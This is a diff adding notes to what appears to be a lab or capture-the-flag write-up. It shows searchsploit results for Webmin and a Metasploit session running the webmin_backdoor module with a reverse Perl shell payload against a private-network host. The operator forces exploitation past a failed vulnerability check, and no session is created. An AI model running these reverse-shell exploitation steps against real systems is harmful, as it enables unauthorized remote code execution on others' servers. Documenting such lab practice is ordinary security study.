@@ -108,6 +108,98 @@ Shellcodes: No Results
 Webmin 1.984 - Remote Code Execution (Auth | linux/webapps/50809.py
 ------------------------------------------- ---------------------------------
 Shellcodes: No Results
-                                               
+                                             
 ```
 
+
+```
+>>msfconsole 
+>>search webmin
+>>use 10
+>>options
+msf exploit(linux/http/webmin_backdoor) > exploit
+[*] Started reverse TCP handler on 10.233.56.40:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[-] Exploit failed: Errno::ENOTCONN Transport endpoint is not connected - getpeername(2)
+[*] Exploit completed, but no session was created.
+msf exploit(linux/http/webmin_backdoor) > exploit
+[*] Started reverse TCP handler on 10.233.56.40:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[-] Please enable the SSL option to proceed
+[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+msf exploit(linux/http/webmin_backdoor) > options
+
+Module options (exploit/linux/http/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, http, sa
+                                         pni
+   RHOSTS     10.233.56.162    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      10000            yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen
+                                       on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.233.56.40     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/http/webmin_backdoor) > set SSL true
+[!] Changing the SSL option's value may require changing RPORT!
+SSL => true
+msf exploit(linux/http/webmin_backdoor) > exploit
+[*] Started reverse TCP handler on 10.233.56.40:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+msf exploit(linux/http/webmin_backdoor) > set AutoCheck false
+AutoCheck => false
+msf exploit(linux/http/webmin_backdoor) > set ForceExploit true
+ForceExploit => true
+msf exploit(linux/http/webmin_backdoor) > exploit
+[*] Started reverse TCP handler on 10.233.56.40:4444 
+[!] AutoCheck is disabled, proceeding with exploitation
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Exploit completed, but no session was created.
+  
+```
+
+```
+msf exploit(linux/http/webmin_backdoor) > set LPORT 20000
+LPORT => 20000
+msf exploit(linux/http/webmin_backdoor) > exploit
+[*] Started reverse TCP handler on 10.233.56.40:20000 
+[!] AutoCheck is disabled, proceeding with exploitation
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Exploit completed, but no session was created.
+```
